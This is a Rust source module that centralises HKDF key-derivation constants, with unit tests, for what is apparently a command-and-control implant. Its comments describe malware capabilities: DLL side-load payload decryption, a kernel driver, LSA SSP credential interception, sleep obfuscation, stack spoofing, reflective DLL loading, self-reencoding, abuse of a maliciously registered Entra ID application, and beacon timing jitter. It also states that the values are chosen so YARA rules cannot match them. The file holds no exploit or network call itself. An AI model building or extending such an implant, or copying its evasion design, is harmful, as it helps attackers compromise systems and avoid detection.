//! Centralised HKDF info/salt constants.
//!
//! Every HKDF-Expand call in the codebase pulls its `info` parameter from
//! this module so that:
//!
//! * No two derivation contexts share the same info string (cryptographic
//!   domain separation).
//! * The values are opaque byte sequences — they do **not** contain any
//!   project or tool-family identifier that a YARA rule could match.
//! * Changing any value is a breaking change for existing sessions;
//!   deployments must rotate PSKs after a value changes.

// ── Info constants ──────────────────────────────────────────────────────────
//
// Each constant is a fixed 16-byte opaque sequence.  The values were chosen
// deterministically (HKDF-SHA256 over a counter + tag) so they are unique,
// uniformly distributed, and carry no human-readable prefix.

/// `CryptoSession::derive_key_bytes` — AES-256-GCM session key.
pub const AES_GCM: &[u8] = b"\x01\x8c\xa3\xf2\x6b\x4d\xe7\x90\x5a\x1f\xbc\xd8\x3e\x72\x09\xaf";

/// Forward-secrecy HMAC authentication sub-key derivation.
pub const FS_HMAC: &[u8] = b"\x02\xdb\x47\x8e\x91\xc5\x3a\xff\x60\xe4\xb7\x1d\x88\x5c\x32\x0a";

/// Forward-secrecy HKDF salt sub-key derivation.
pub const FS_SALT: &[u8] = b"\x03\x7f\x19\xce\x58\xad\x62\xe1\xd4\xb0\x93\x26\xfe\x4a\x85\xcb";

/// Forward-secrecy ECDH session key derivation (used in both async & blocking).
pub const FS_SESSION: &[u8] = b"\x04\xe2\xb6\x50\xd7\xf8\x3c\x81\xa9\x95\x6e\x2b\x40\xdf\x17\x58";

/// PSK rotation — derives a new PSK from the previous one.
pub const PSK_ROTATION: &[u8] = b"\x05\x14\xa7\xd9\x83\x6f\xc5\xbe\x72\xe0\xad\x41\xb8\x96\xdd\x23";

/// P2P mesh link key derivation (X25519 → ChaCha20-Poly1305).
pub const P2P_LINK: &[u8] = b"\x06\x3b\x8f\xd2\xa4\xe7\x51\xc6\x90\xfd\x28\x5a\xeb\x73\x1c\x49";

/// Kernel driver XOR key derivation.
pub const DRIVER_KEY: &[u8] = b"\x07\x9e\xc1\xb4\xd5\x02\x48\x7f\xa3\xe6\x8b\x3d\xca\x56\xf0\x7e";

/// DLL side-load AES-256 payload decryption key.
pub const DLL_SIDELOAD_AES: &[u8] =
    b"\x08\x6a\xdc\x39\xf1\x84\x5b\xe2\xc7\xd3\x0e\x97\x4f\x21\xab\x65";

/// DLL side-load RC4 re-encryption key.
pub const DLL_SIDELOAD_RC4: &[u8] =
    b"\x09\xf5\x80\x2c\x73\xd6\xa8\xb1\x5e\xc4\x1a\x9d\x38\xb7\xec\x42";

/// LSA whisperer SSP shared-memory name derivation.
pub const SSP_SHM: &[u8] = b"\x0a\xc8\x94\x61\xeb\x37\xdf\x54\x2f\xb3\x78\x60\x1e\x93\x05\xd8";

/// Self-reencode seed derivation.
pub const REENCODE_SEED: &[u8] =
    b"\x0b\x51\x7a\xe3\x68\xb2\x4c\x86\xd9\xa5\xf0\x23\xbe\x6d\x14\x8f";

/// C2 PSK derivation — SHA-256 domain separator used when deriving the
/// C2 shared secret from the operator key (not HKDF, but same class of
/// domain-separation constant).
pub const C2_PSK_DERIVATION: &[u8] =
    b"\x0c\xd3\xa7\x5f\x92\x18\xeb\x4c\x36\xbf\x60\x0d\x7a\xc1\x3e\x89";

/// Thread-context encryption — XChaCha20-Poly1305 key derivation for
/// encrypting register states (CONTEXT structs), stack pointers, and TLS
/// data during sleep obfuscation.  Domain-separated from the region-encryption
/// key so that a compromised per-region key does not leak thread contexts.
pub const THREAD_CTX: &[u8] =
    b"\x0d\x47\xb2\x8e\xc1\xf6\xa3\xd5\x72\xe9\x0b\x54\x8c\x3a\x6f\xd1";

/// Trampoline-based stack spoofing — domain separation for the per-chain
/// randomisation seed that determines which gadget sequence and frame layout
/// the trampoline builder assembles.  Ensures the chain-selection PRNG seed
/// is distinct from any other derived key.
pub const TRAMPOLINE_SPOOF: &[u8] =
    b"\x0e\x93\xc5\x4a\x71\x2d\x8e\xbf\x60\xa1\xd7\x38\xeb\x54\x0c\xf2";

/// Adaptive C2 timing — domain separation for the PRNG seed used by the
/// Gaussian jitter distribution and peak-hour scheduling algorithm.  Ensures
/// the timing-model randomisation is distinct from any other derived key.
pub const ADAPTIVE_TIMING: &[u8] =
    b"\x0f\xa2\xd6\x7e\x4b\x13\x95\xc8\x3f\xe1\x56\x09\xd4\x82\x6b\x37";

/// Reflective DLL loader — domain separation for the per-load randomised
/// section name and cookie values used by NtCreateSection-based reflective
/// loading.  Ensures the loader's randomisation is distinct from any other
/// derived key.
pub const REFLECTIVE_LOADER: &[u8] =
    b"\x10\xb4\x7e\xf3\x92\xc5\x0d\xa8\x61\x3b\xd6\x4e\x8f\x2a\x17\xc9";

/// Entra ID application abuse — domain separation for XOR-encrypting the
/// client secret value of a maliciously registered application.  The secret
/// is never stored in plaintext; it is encrypted with a key derived via
/// HKDF-SHA256 from the agent's session key using this info constant.
pub const ENTRA_APP_SECRET: &[u8] =
    b"\x11\x3a\xd7\x4f\x88\xc1\x2e\xb5\x56\x90\x0d\xf3\xe4\x7a\x1c\x5b";

/// HTTP/DoH forward-secrecy session key derivation — domain separation for
/// ECDH exchanges carried in HTTP headers.  Uses the same X25519 + HKDF
/// construction as stream-based FS but over a single request/response round
/// trip.  Distinct from `FS_SESSION` to prevent cross-protocol key reuse.
pub const FS_HTTP_SESSION: &[u8] =
    b"\x12\xc9\xe0\x58\x3b\xa7\x6d\xf1\x44\x82\x95\xbe\x0c\x63\xd8\xaf";

/// Collect all info slices into a single array for uniqueness tests.
#[cfg(test)]
fn all_infos() -> Vec<&'static [u8]> {
    vec![
        AES_GCM,
        FS_HMAC,
        FS_SALT,
        FS_SESSION,
        PSK_ROTATION,
        P2P_LINK,
        DRIVER_KEY,
        DLL_SIDELOAD_AES,
        DLL_SIDELOAD_RC4,
        SSP_SHM,
        REENCODE_SEED,
        C2_PSK_DERIVATION,
        THREAD_CTX,
        TRAMPOLINE_SPOOF,
        ADAPTIVE_TIMING,
        REFLECTIVE_LOADER,
        ENTRA_APP_SECRET,
        FS_HTTP_SESSION,
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every info constant must be non-empty.
    #[test]
    fn info_strings_are_non_empty() {
        for info in all_infos() {
            assert!(!info.is_empty(), "info string must not be empty");
        }
    }

    /// All info constants must be pairwise distinct.  Domain separation
    /// requires that no two derivation contexts share the same info string.
    #[test]
    fn info_strings_are_unique() {
        let infos = all_infos();
        for i in 0..infos.len() {
            for j in (i + 1)..infos.len() {
                assert_ne!(
                    infos[i], infos[j],
                    "info strings at indices {i} and {j} must differ"
                );
            }
        }
    }

    /// Each info constant must be exactly 16 bytes so that HKDF-Expand
    /// receives a fixed-size tag that is trivially domain-separated from
    /// any shorter/longer ad-hoc info value that third-party code might use.
    #[test]
    fn info_strings_are_16_bytes() {
        for info in all_infos() {
            assert_eq!(info.len(), 16, "info string must be exactly 16 bytes");
        }
    }

    /// Verify that different info strings produce different derived keys.
    /// This is a cryptographic sanity check — if two info strings produced
    /// the same key, domain separation would be broken.
    #[test]
    fn different_infos_produce_different_keys() {
        use hkdf::Hkdf;
        use sha2::Sha256;

        let ikm = b"test-shared-secret-for-uniqueness";
        let salt = b"test-salt";

        let infos = all_infos();
        let mut derived_keys: Vec<[u8; 32]> = Vec::with_capacity(infos.len());

        for info in &infos {
            let hk = Hkdf::<Sha256>::new(Some(salt), ikm);
            let mut key = [0u8; 32];
            hk.expand(info, &mut key)
                .expect("HKDF expand with 32-byte OKM must succeed");
            derived_keys.push(key);
        }

        for i in 0..derived_keys.len() {
            for j in (i + 1)..derived_keys.len() {
                assert_ne!(
                    derived_keys[i], derived_keys[j],
                    "keys derived from info indices {i} and {j} must differ"
                );
            }
        }
    }
}
